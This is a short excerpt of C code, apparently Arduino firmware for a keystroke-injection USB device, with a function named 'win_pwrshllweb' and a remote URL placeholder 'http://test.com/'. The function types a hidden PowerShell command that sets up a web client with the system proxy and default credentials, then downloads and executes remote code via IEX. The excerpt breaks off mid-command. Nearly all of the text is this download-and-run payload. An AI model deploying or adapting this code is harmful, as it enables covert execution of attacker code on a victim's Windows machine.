...
// url for downloading remote files to machine
const char *remote_url = "http://test.com/"; 
...
void win_pwrshllweb(void) {
  ...
  delay(1000);
  Keyboard.print("powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring('");
